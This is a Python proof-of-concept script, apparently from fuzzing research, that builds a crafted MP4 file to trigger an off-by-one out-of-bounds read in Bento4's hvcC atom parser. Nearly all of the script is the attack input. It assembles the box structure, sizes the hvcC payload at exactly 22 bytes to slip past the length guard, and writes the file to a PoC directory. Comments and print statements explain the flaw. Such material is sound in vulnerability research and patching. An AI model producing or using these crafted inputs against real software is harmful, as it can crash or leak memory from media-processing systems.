import struct, sys, os

def box(type4, data=b''):
    return struct.pack('>I', 8 + len(data)) + type4.encode() + data

def fullbox(type4, version, flags, data=b''):
    return box(type4, struct.pack('>I', (version << 24) | (flags & 0xFFFFFF)) + data)

# ftyp box
ftyp = box('ftyp',
    b'isom' +           # major brand
    struct.pack('>I', 0x200) +  # minor version
    b'isomiso2'         # compatible brands
)

# mvhd (version 0)
mvhd_data = (
    struct.pack('>I', 0) +   # creation_time
    struct.pack('>I', 0) +   # modification_time
    struct.pack('>I', 1000) + # timescale
    struct.pack('>I', 0) +   # duration
    struct.pack('>I', 0x00010000) +  # rate = 1.0
    struct.pack('>H', 0x0100) +      # volume = 1.0
    b'\x00' * 10 +           # reserved
    b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +  # matrix
    b'\x00' * 24 +           # pre_defined
    struct.pack('>I', 2)     # next_track_id
)
mvhd = fullbox('mvhd', 0, 0, mvhd_data)

# tkhd (version 0)
tkhd_data = (
    struct.pack('>I', 0) +   # creation_time
    struct.pack('>I', 0) +   # modification_time
    struct.pack('>I', 1) +   # track_id
    struct.pack('>I', 0) +   # reserved
    struct.pack('>I', 0) +   # duration
    b'\x00' * 8 +            # reserved
    struct.pack('>H', 0) +   # layer
    struct.pack('>H', 0) +   # alternate_group
    struct.pack('>H', 0) +   # volume
    struct.pack('>H', 0) +   # reserved
    b'\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00' +  # matrix
    struct.pack('>I', 320 << 16) +   # width (fixed point 16.16)
    struct.pack('>I', 240 << 16)     # height (fixed point 16.16)
)
tkhd = fullbox('tkhd', 0, 3, tkhd_data)

# mdhd (version 0)
mdhd_data = (
    struct.pack('>I', 0) +   # creation_time
    struct.pack('>I', 0) +   # modification_time
    struct.pack('>I', 90000) + # timescale
    struct.pack('>I', 0) +   # duration
    struct.pack('>H', 0x55C4) +  # language (und)
    struct.pack('>H', 0)     # pre_defined
)
mdhd = fullbox('mdhd', 0, 0, mdhd_data)

# hdlr (vide handler)
hdlr_data = (
    struct.pack('>I', 0) +   # pre_defined
    b'vide' +                # handler_type
    b'\x00' * 12 +          # reserved
    b'VideoHandler\x00'     # name
)
hdlr = fullbox('hdlr', 0, 0, hdlr_data)

# vmhd
vmhd = fullbox('vmhd', 0, 1, struct.pack('>H', 0) + b'\x00' * 6)

# url_ (self-contained, flags=1)
url_ = fullbox('url ', 0, 1, b'')

# dref
dref_data = struct.pack('>I', 1) + url_  # entry_count=1
dref = fullbox('dref', 0, 0, dref_data)

# dinf
dinf = box('dinf', dref)

# hvcC atom: 8-byte header + exactly 22 bytes of payload = 30 bytes total
# Trigger: payload_size = 30 - 8 = 22
# Guard: if (22 < 22) return;  -> (22 < 22) = False -> continues
# OOB read: payload[22] at line 282 reads 1 byte past the 22-byte buffer
hvcc_payload = b'\x00' * 22  # exactly 22 bytes: valid indices 0..21, [22] is OOB
hvcc = struct.pack('>I', 30) + b'hvcC' + hvcc_payload  # total = 30 bytes

# hvc1 visual sample entry
# ISO 14496-12 VisualSampleEntry layout after the 8-byte SampleEntry header:
#   2 bytes: pre_defined = 0
#   2 bytes: reserved = 0
#  12 bytes: pre_defined[3] (3 x uint32)
#   2 bytes: width
#   2 bytes: height
#   4 bytes: horizresolution
#   4 bytes: vertresolution
#   4 bytes: reserved
#   2 bytes: frame_count
#  32 bytes: compressorname
#   2 bytes: depth
#   2 bytes: pre_defined = -1
# = 70 bytes of visual fields (AP4_VisualSampleEntry::GetFieldsSize() = 8+70 = 78)
hvc1_entry = (
    b'\x00' * 6 +                       # reserved (6 bytes) [SampleEntry]
    struct.pack('>H', 1) +              # data_reference_index [SampleEntry]
    struct.pack('>H', 0) +              # pre_defined [VisualSampleEntry]
    struct.pack('>H', 0) +              # reserved [VisualSampleEntry]
    b'\x00' * 12 +                      # pre_defined[3] (12 bytes) [VisualSampleEntry]
    struct.pack('>H', 320) +            # width [VisualSampleEntry]
    struct.pack('>H', 240) +            # height [VisualSampleEntry]
    struct.pack('>I', 0x00480000) +     # horizresolution [VisualSampleEntry]
    struct.pack('>I', 0x00480000) +     # vertresolution [VisualSampleEntry]
    struct.pack('>I', 0) +              # reserved [VisualSampleEntry]
    struct.pack('>H', 1) +              # frame_count [VisualSampleEntry]
    b'\x00' * 32 +                      # compressorname [VisualSampleEntry]
    struct.pack('>H', 0x0018) +         # depth [VisualSampleEntry]
    struct.pack('>H', 0xFFFF) +         # pre_defined (-1) [VisualSampleEntry]
    hvcc                                # hvcC child box (30 bytes)
)
# hvc1_entry layout:
# 6+2 = 8 bytes (SampleEntry fields)
# 2+2+12+2+2+4+4+4+2+32+2+2 = 70 bytes (VisualSampleEntry fields)
# 30 bytes (hvcC child)
# Total data = 8+70+30 = 108 bytes
# Total hvc1 box = 8 + 108 = 116 bytes
hvc1 = box('hvc1', hvc1_entry)

# Verify the layout
assert len(hvc1_entry) == 108, f"Expected 108, got {len(hvc1_entry)}"
assert len(hvcc) == 30, f"hvcC should be 30 bytes, got {len(hvcc)}"

# stsd: version=0, flags=0, entry_count=1
stsd_data = struct.pack('>I', 1) + hvc1  # entry_count=1
stsd = fullbox('stsd', 0, 0, stsd_data)

# stts (empty)
stts = fullbox('stts', 0, 0, struct.pack('>I', 0))

# stsc (empty)
stsc = fullbox('stsc', 0, 0, struct.pack('>I', 0))

# stsz (empty)
stsz = fullbox('stsz', 0, 0, struct.pack('>I', 0) + struct.pack('>I', 0))

# stco (empty)
stco = fullbox('stco', 0, 0, struct.pack('>I', 0))

# stbl
stbl = box('stbl', stsd + stts + stsc + stsz + stco)

# minf
minf = box('minf', vmhd + dinf + stbl)

# mdia
mdia = box('mdia', mdhd + hdlr + minf)

# trak
trak = box('trak', tkhd + mdia)

# moov
moov = box('moov', mvhd + trak)

# Assemble the full MP4
mp4 = ftyp + moov

out_path = '/data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4HvccAtom_cpp/vuln_001.mp4'
with open(out_path, 'wb') as f:
    f.write(mp4)

print(f"Written {len(mp4)} bytes to {out_path}")
print(f"hvcC atom: total size=30, payload=22 bytes")
print(f"Payload size computed: 30 - 8 = 22")
print(f"Guard check: (22 < 22) = False -> does NOT return")
print(f"OOB read: payload[22] reads 1 byte past end of 22-byte buffer")
print(f"hvc1 content: {len(hvc1_entry)} bytes (should be 108)")
print(f"  - SampleEntry fields: 8 bytes")
print(f"  - VisualSampleEntry fields: 70 bytes")
print(f"  - hvcC child: 30 bytes")
